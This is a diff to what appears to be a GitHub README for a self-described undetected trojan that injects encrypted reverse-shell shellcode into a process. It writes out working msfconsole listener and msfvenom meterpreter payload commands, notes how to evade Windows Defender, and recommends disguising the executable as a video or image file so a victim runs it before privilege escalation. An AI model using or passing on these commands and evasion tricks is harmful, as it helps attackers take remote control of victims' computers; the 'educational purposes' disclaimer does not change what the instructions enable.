@@ -1,15 +1,15 @@
-# Encrypted Trojan with Process Hollowing (Undetected)
-Encrypted malware using process hollowing, it creates a shell injecting shellcode which is encrypted using xor, base64 and hexadecimal encoding, undetected by Windows defender. 
+# Encrypted Local Process injection Trojan
+Malware that creates a process and injects a shellcode that opens a reverse shell. Shellcode encrypted using xor, base64 and hexadecimal encoding, undetected by Windows defender. 
 This code is for educational purposes only, do not use it for any malicious or unauthorized activity.
 
 # 💻 Code
 Simple shellcode execution technique in which the payload is decrypted, copied into memory, and executed in the same process without writing it into disk. Similar to my other trojan, [Self injection](https://github.com/Hue-Jhan/Encrypted-Trojan-Undetected), but slightly different.
 
 ### 1) Listener and payload:
-First, on the attacker's machine i used the classic multi handler exploit to run the payload: 
+First, on the attacker's machine i used a classic multi handler exploit to run the payload: 
 ``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```
 
-The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
+The payload is a simple msfvenom reverse-shell shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
 ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 
 
 You can embed the code into pretty much anything, you can even use tools to mask the exe file into a mp4 or jpg file, complete with a new icon and a name, even the extension can be masked. Once the victim runs the exe, a new session will pop up on metasploit, where you can create a shell and work towards privilege escalation.
